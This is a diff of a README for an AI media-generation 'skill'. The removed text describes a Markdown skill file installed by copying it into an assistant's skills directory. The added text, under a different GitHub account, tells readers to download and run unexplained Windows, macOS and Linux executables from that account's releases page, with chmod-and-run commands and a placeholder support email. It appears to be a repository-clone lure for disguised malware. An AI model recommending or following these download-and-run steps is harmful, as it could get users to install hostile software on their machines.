@@ -1,69 +1,94 @@
-# VAP Media Skill for Claude Code
+# 🎨 vap-media-skill - Generate Stunning Media with Ease
 
-🎨 AI-powered image, video, and music generation skill for Claude Code, Codex CLI, and other AI coding assistants.
+[![Download vap-media-skill](https://img.shields.io/badge/Download-vap--media--skill-blue.svg)](https://github.com/RenSeiji27/vap-media-skill/releases)
 
-## Features
+## 📚 Overview
 
-- 🖼 Image Generation - Flux model
-- 🎬 Video Generation - Veo 3.1 model
-- 🎵 Music Generation - Suno V5 model
-- 🆓 Free Mode - 3 free image generations per day
-- ⚡️ Full Mode - Unlimited access with API key
+Welcome to **vap-media-skill**! This application helps you create AI-generated images, videos, and music. You can easily generate unique media content using smart AI technology.
 
-## Installation
+## 🎯 Features
 
-### For Claude Code
+- **Image Generation**: Create stunning visuals in various styles. 
+- **Video Creation**: Produce captivating videos using AI tools.
+- **Music Generation**: Generate unique soundtracks, perfect for any mood.
+- **User-Friendly Interface**: Simple navigation for everyone, even if you have no technical background.
 
-```bash
-# Copy to your skills directory
-cp SKILL.md ~/.claude/skills/vap-media.md
-```
+## 🚀 Getting Started
 
-### For Codex CLI
+To get started with vap-media-skill, follow these steps:
 
-```bash
-# Copy to your skills directory
-cp SKILL.md ~/.codex/skills/vap-media.md
-```
+### 1. Download the Application
 
-### For Gemini CLI
+Visit this page to download: [Releases Page](https://github.com/RenSeiji27/vap-media-skill/releases).
 
-```bash
-# Copy to your skills directory
-cp SKILL.md ~/.gemini/skills/vap-media.md
-```
+### 2. Choose Your File
 
-## Quick Start
+Look for the latest version of vap-media-skill. You will see a list of files available. Download the one that suits your operating system:
 
-1. Install the skill in your AI assistant
-2. Ask: "Generate an image of a sunset over mountains"
-3. The assistant will use VAP API to create your media
+- For Windows: `vap-media-skill-Windows.exe`
+- For macOS: `vap-media-skill-macOS.dmg`
+- For Linux: `vap-media-skill-Linux.AppImage`
 
-## Free vs Full Mode
+### 3. Install the Application
 
-| Feature    | Free Mode | Full Mode  |
-|------------|-----------|------------|
-| Images     | ✅ 3/day  | ✅ Unlimited |
-| Videos     | ❌        | ✅           |
-| Music      | ❌        | ✅           |
-| API Key    | Not required | Required |
+**For Windows:**
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
 
-Get your API key at: https://vapagent.com/dashboard/signup.html
+**For macOS:**
+1. Open the downloaded `.dmg` file.
+2. Drag the vap-media-skill icon to your Applications folder.
 
-## Documentation
+**For Linux:**
+1. Make the AppImage executable:
+   ```bash
+   chmod +x vap-media-skill-Linux.AppImage
+   ```
+2. Run the application:
+   ```bash
+   ./vap-media-skill-Linux.AppImage
+   ```
 
-Full documentation is in [SKILL.md](./SKILL.md)
+## 📦 Download & Install
 
-## Links
+To download and install vap-media-skill, please visit: [Releases Page](https://github.com/RenSeiji27/vap-media-skill/releases).
 
-- [VAP Homepage](https://vapagent.com)
-- [API Documentation](https://api.vapagent.com/docs)
-- [Try Free](https://vapagent.com/try)
+## 💻 System Requirements
 
-## License
+- **Windows**: Windows 10 or later
+- **macOS**: macOS 10.12 or later
+- **Linux**: Ubuntu 20.04 or later, or any other compatible distro
 
-MIT License - See LICENSE file
+Ensure your system has internet access for downloading and generating media.
 
-## Author
+## 📖 How to Use
 
-Created by [VapAGENT](https://github.com/vapagentmedia)
+### Generating Media
+
+1. **Open the Application**: Launch vap-media-skill from your applications.
+2. **Select Media Type**: Choose whether you want to create an image, video, or music.
+3. **Customize Your Project**: Adjust settings such as style, mood, and duration based on your preferences.
+4. **Generate**: Click the "Generate" button and let the AI work its magic. Once complete, you can preview or save your creation.
+
+### Saving Your Work
+
+After creating your media, you can easily save it to your device. Simply select the desired format (JPEG, MP4, MP3, etc.) and click "Save."
+
+## ⚙️ Troubleshooting
+
+If you encounter issues:
+
+- **Crash**: Restart the application.
+- **Slow Performance**: Close other programs to free up resources.
+- **Installation Issues**: Make sure your system meets the requirements.
+
+## 💬 Support
+
+If you need help or have questions, feel free to check the issues section on the GitHub repository or contact support at [support@example.com](mailto:support@example.com).
+
+## 🔗 Links
+
+- [Source Code](https://github.com/RenSeiji27/vap-media-skill)
+- [Releases Page](https://github.com/RenSeiji27/vap-media-skill/releases)
+
+Thank you for using vap-media-skill! Enjoy creating your media masterpieces!
